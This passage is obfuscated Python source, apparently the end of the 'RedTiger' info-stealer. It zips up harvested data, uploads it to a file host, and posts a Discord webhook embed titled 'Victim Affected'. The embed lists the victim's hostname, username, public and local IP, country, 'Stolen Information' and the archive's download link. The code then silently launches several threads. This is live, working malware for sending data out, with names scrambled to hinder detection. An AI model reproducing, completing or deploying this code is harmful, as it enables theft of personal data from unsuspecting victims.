        files={"file": (f"RedTiger_{YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC.replace(' ', '_')}.zip", DUPOEEPNTBOWDRRCFUKPDKKYIMMVXHUTCDDHBNNOMTJJJCCFSBCANNPLSBRG)}
    )

    RAWLOLGJUATZXMRXQPUPCWKPIWGMIGBGQHPJEMXIGTXBQOYMGTNCHNVQHTZKIEJSNXEZESRLXQIGRAVWYXYFN = YXLTPAMPZYVGNMIPAKKOIEJLZSVGUQYLDPDTCTQQPINUDYRUJABVRAFRBDWYRCIKYWYVJYTQDZ.json()["data"]["downloadPage"]
except Exception as e:
    RAWLOLGJUATZXMRXQPUPCWKPIWGMIGBGQHPJEMXIGTXBQOYMGTNCHNVQHTZKIEJSNXEZESRLXQIGRAVWYXYFN = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=DQRTDBHQCBUZQXOQYPSXWFDZXURYVYQYQAEEPUTUCVMKZVHQEELYNHMUUMNXLMGWHASFHIBMXLRSYCYJXKFJIZDOUITJMVHWTEH
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {TLEDMMOGLTNSNDNFJOADBHXIUGUFJSXLTZWFOMPIPGTJQTZOHSMUZKWXSEFNECSCCCIIKFKGSFTPYAOETTZ}
Username    : {YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC}
DisplayName : {FRAPRNPUJDTUFUDBUDMDWJQZEOZWWNXSKCFOJZJCBJRSPUFGUJTFHRWHFMLJTPKBRLWAXMCHNEEVI}
Ip Public   : {WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ}
Ip Local    : {TCBOYUETIOAULXLNLRCLAOVPCVNVWRCLCCMRWMYJAITANVIINDHHCX}
Country     : {QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(LMBGMJCJNUKRWBCALONRJKJGHWLVSPGHRLHGDMTNZJXDBWXDSXBBHIQRYWHJAPNUFVYZJHVMFHBH)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{RAWLOLGJUATZXMRXQPUPCWKPIWGMIGBGQHPJEMXIGTXBQOYMGTNCHNVQHTZKIEJSNXEZESRLXQIGRAVWYXYFN}"""
).set_footer(
    text=WQJVAJTCANBACODWPJVAVUTZHQVJVQQJJKELJXCOZCXVOMUVDMHARBMMACNJRTRBMSAUAFCKHZQAVYSG, 
    icon_url=FPGNHFYHDWZNPTRLBQAPYAHQJNHTQOOSQGEYWJPCRFGCPJHXNZACHVQHWELHEIDMKIVOIWTBBIRTAY
)

try:  
    BNPGRZBXGKRKIGZQNROTHEMAUYOWYEIIZWUCBFOBDBHTNFVUZJUVWVCLMQLVRVJAVEERKMKRISNVVQWV = discord.SyncWebhook.from_url(LQHEDZORDRARRIRKBYAAVWQSYMRBSWLYMBMLVVVBGOEQELSZVEATZTYJLIQNJQIUXL)
    BNPGRZBXGKRKIGZQNROTHEMAUYOWYEIIZWUCBFOBDBHTNFVUZJUVWVCLMQLVRVJAVEERKMKRISNVVQWV.send(embed=embed, username=FEIASJOKUVWMEETJWPBHIRWHDNGFMSSTJRPIBIKTYNSGBBRAVR, avatar_url=FPGNHFYHDWZNPTRLBQAPYAHQJNHTQOOSQGEYWJPCRFGCPJHXNZACHVQHWELHEIDMKIVOIWTBBIRTAY)
except: pass


try: threading.Thread(target=LLSRBVVXNAGEVLBXYQWNZDTXXLQMIMIDNLPPBFAUKEFWIBHHPIQKXEPKHJJZQIXKGV).start()
except: pass
try: threading.Thread(target=JBEZSTUMACWARUYLMKWMELFCVDAQWLNNKMZZRXJVMBQERVMZFRSXYCBOBYMXKCRVRFANKHD).start()
except: pass
try: threading.Thread(target=HAXRSUYSYAVQKWUETLNWMVOEKLSAPZVPSPXCKELGEAEKGUBOYE).start()
except: pass
try: threading.Thread(target=MJGPPIQLYGAZANOBHOZWKJVFNPSLZTCGQUZCCIVKOJLHJZDBSFUNWWTDCYKFCMXRZWWVLRJKXJDHIJUMMWJRXFPLLSWQRMAX).start()
except: pass
try: threading.Thread(target=HQIRJTEZYQBSCFNWJQUQPJUMVDKZWZUFSJMWFXURPFJFDVXSVGVMDOVIIKJSVSCHKOTIAHMKWW).start()
except: pass
try: threading.Thread(target=TMBHJXFAUBGUJNCRRRAVHZAZRRVUDJDZJICXBCGQXLPABFWPEWHGGRQNFZBNITAVDRRNYIUBRAEYCDVKWHAQSWYHPRQPMOSMKIT).start()
except: pass
try: threading.Thread(target=QUXKWTERWBMFNCBNTOPMZFOLTPVAFUDMSCVEAHDOKJEYHZMTZHDNMKPIBAIKAFIQRVKSBYTVORVUIWZTWYAK).start()
except: pass
try: threading.Thread(target=PEUULYTUWUKVIGEQVEULMLOIQOPVOVRQQQZKDXEFUYTDVGXPQTRGETUNLLWJSIENXWJOSMWN).start()
except: pass
